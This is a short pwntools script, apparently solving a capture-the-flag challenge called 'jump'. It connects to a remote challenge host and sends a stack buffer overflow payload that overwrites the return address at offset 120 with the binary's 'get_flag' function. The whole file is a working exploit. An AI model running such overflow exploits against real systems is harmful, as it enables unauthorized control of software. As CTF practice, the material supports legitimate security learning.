#!/usr/bin/python3

from pwn import *


context.binary = './bin/jump'

e = ELF('./bin/jump')
rop = ROP('./bin/jump')
p = remote('34.150.138.102', 5004)

payload = flat({120: e.sym['get_flag']})

p.sendline(payload)
p.interactive()
